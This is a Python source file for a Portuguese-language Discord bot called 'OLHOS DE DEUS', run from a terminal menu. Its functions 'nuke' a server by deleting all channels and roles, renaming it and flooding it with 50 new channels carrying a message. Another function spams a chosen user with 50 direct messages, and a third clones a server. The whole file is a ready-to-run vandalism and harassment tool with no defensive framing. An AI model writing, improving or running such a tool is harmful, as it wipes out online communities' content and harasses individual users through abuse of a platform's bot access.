#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# OLHOS DE DEUS – By: V4Warden *

import os, sys, json, time, random, string, asyncio, discord
from discord.ext import commands

# ---------- BANNER ----------
BANNER = r"""
  @@@@                   
      @@    @@@@@  @@@@ @@@@  
      @          @@@@ @@    @ 
      @          @ @@@@@@   @ 
     @          @@@@@   @@@@@ 
    @                @@@@@@@@ 
   @                   @@@@@  
 @@@     @                 @  
   @    @@                 @  
   @@                @@    @  
  @@@         @@@    @@   @@  
     @@                  @@@  
       @@@             @@@    
   @@@@@ @@@@@@@@@@@@@@@      
   @    @@@@@    @@@@   @     
   @    @@@ @@@@@@@@   @@@    
   @@@@@@@@@@@@@  @@@@@   @@  
  @      @@@@@@@@@@@       @  
 @         @@@@@@@@        @  
  @        @@@@@@@@        @  
  @@       @@    @@      @@   
    @@@@@@@        @@@@@@    
 O L H O S   D E   D E U S
         By: V4Warden
"""

# ---------- CONFIG ----------
CONFIG_FILE = "olhos_config.json"
if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
        cfg = json.load(f)
else:
    cfg = {}

def save_cfg():
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)

# ---------- INPUT ASSÍNCRONO ----------
async def ainput(prompt=""):
    return await asyncio.to_thread(input, prompt)

# ---------- BOT ----------
intents = discord.Intents.all()
intents.message_content = True

class MyBot(commands.Bot):
    async def setup_hook(self):
        self.loop.create_task(terminal_panel())

bot = MyBot(command_prefix="!", intents=intents, help_command=None)

# ---------- FUNÇÕES ----------
def rnd_str(n=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def clone_server(guild_id: int):
    try:
        src = await bot.fetch_guild(guild_id)
    except discord.NotFound:
        print("[-] Servidor inválido ou bot não está nele.")
        await asyncio.sleep(2)
        return
    except discord.Forbidden:
        print("[-] Sem permissão para acessar o servidor.")
        await asyncio.sleep(2)
        return

    new = await bot.create_guild(f"Clone-{src.name}-{rnd_str()}")
    await asyncio.sleep(5)
    print(f"[+] Clone do servidor '{src.name}' criado.")
    await asyncio.sleep(2)

async def spam_dm(user_id: int, texto: str):
    try:
        user = await bot.fetch_user(user_id)
    except:
        print("[-] Usuário inválido.")
        await asyncio.sleep(2)
        return

    for _ in range(50):
        try:
            await user.send(texto)
            await asyncio.sleep(0.3)
        except:
            pass

    print("[+] Spam finalizado.")
    await asyncio.sleep(2)

async def nuke_server(guild_id: int):
    g = bot.get_guild(guild_id)
    if not g:
        print("[-] Bot fora do servidor.")
        await asyncio.sleep(2)
        return

    msg   = cfg.get("nuke_msg", "OLHOS DE DEUS")
    sname = cfg.get("server_name", "RIP")
    cname = cfg.get("channel_name", "ruina")

    for ch in list(g.channels):
        try:
            await ch.delete()
        except:
            pass

    for r in list(g.roles):
        try:
            await r.delete()
        except:
            pass

    try:
        await g.edit(name=sname)
    except:
        pass

    for i in range(50):
        try:
            ch = await g.create_text_channel(f"{cname}-{i}")
            await ch.send(msg)
        except:
            pass

    print("[+] Nuke finalizado.")
    await asyncio.sleep(2)

# ---------- PAINEL ----------
async def terminal_panel():
    await bot.wait_until_ready()

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(BANNER)
        print("1 – Clonar servidor")
        print("2 – Spam DM")
        print("3 – Nukar servidor")
        print("4 – Configurar mensagem do nuke")
        print("5 – Configurar nome do servidor pós-nuke")
        print("6 – Configurar nome base dos canais")
        print("7 – Ver configurações")
        print("0 – Sair")

        opt = (await ainput("> ")).strip()

        if opt == "1":
            gid = int(await ainput("ID do servidor: "))
            await clone_server(gid)

        elif opt == "2":
            uid = int(await ainput("ID do usuário: "))
            txt = await ainput("Mensagem: ")
            await spam_dm(uid, txt)

        elif opt == "3":
            gid = int(await ainput("ID do servidor: "))
            await nuke_server(gid)

        elif opt == "4":
            cfg["nuke_msg"] = await ainput("Mensagem: ")
            save_cfg()

        elif opt == "5":
            cfg["server_name"] = await ainput("Nome: ")
            save_cfg()

        elif opt == "6":
            cfg["channel_name"] = await ainput("Nome base: ")
            save_cfg()

        elif opt == "7":
            print(json.dumps(cfg, indent=2, ensure_ascii=False))
            await ainput("\nEnter para continuar...")

        elif opt == "0":
            os._exit(0)

        else:
            print("Opção inválida.")
            await asyncio.sleep(1)

# ---------- START ----------
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(BANNER)
        print("Uso: python bot.py <TOKEN>")
        sys.exit(1)

    bot.run(sys.argv[1])